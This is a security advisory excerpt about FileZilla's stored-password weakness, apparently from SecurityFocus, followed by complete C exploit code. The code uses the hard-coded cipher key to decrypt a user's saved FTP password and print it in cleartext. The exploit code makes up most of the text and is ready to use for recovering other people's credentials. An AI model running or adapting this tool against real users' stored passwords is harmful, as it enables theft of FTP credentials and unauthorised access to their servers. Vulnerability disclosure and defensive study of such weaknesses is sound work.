source: http://www.securityfocus.com/bid/14730/info

FileZilla FTP client may allow local attackers to obtain user passwords and access remote servers.

The application uses a hard-coded cipher key to decrypt the password, which is stored in an XML file or the Windows Registry.

This can allow the attacker to gain access to an FTP server with the privileges of the victim. 

*/


//Includes
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <windows.h>

//Macros
#define MAX_SIZE 150
#define SLEEP_TIME 5000

//Global variable (cypher key)
char *m_key = "FILEZILLA1234567890ABCDEFGHIJKLMNOPQRSTUVWXYZ";


//PRE:  decimal values representing ASCII chars,
//              every three digits becomes one ASCII char
//              e.g.:   042040063063
//POST: ASCII chars are copied back to buff[]
//              e.g.:   *(??
//              the length of the new string is returned
int digit2char(char buff[])
{
        char tmp_buff[4], ascii_buff[MAX_SIZE];
        unsigned int i=0, j=0, n=0, len=(strlen(buff)/3);
        for(i=0,j=0;i<strlen(buff);i+=3,++j)
        {
                tmp_buff[0]=buff[i];
                tmp_buff[1]=buff[i+1];
                tmp_buff[2]=buff[i+2];
                tmp_buff[3]='\0';

                n=atoi(tmp_buff);
                ascii_buff[j]=(char)n;
        }
        ascii_buff[j]='\0';
        printf("ascii_buff:%s\n", ascii_buff);
        strcpy(buff, ascii_buff);

        return len;
}

//PRE: buffer containing ASCII chars of cypher
//     (rather than their numberic ASCII value)
//POST:length of cleartext password is returned
unsigned int decrypt(char buff[])
{
        unsigned int i, pos, len;

        len=digit2char(buff);
        pos=len%strlen(m_key);

        for (i=0;i<len;i++)
                buff[i]=buff[i]^m_key[(i+pos)%strlen(m_key)];

        return len;
}

int main(void)
{
        char cypher[MAX_SIZE];
        unsigned int len=0,i=0;

        printf("Enter cypher (encrypted password)\ne.g.:
120125125112000\n->");
        scanf("%s", cypher);
        if(strlen(cypher)%3==0)
        {
                len=decrypt(cypher);
                printf("cleartext password:");
                for(i=0;i<len;++i)
                        printf("%c",cypher[i]);
                printf("\n");
        }
        else
        {
                printf("You didn't enter a valid cypher!\n");
                printf("It should be a numeric value whose length is multiple of
3\n");
        }

        printf("Ending program in %d seconds...\n", SLEEP_TIME/1000);
        Sleep(SLEEP_TIME);
        return 0;
}

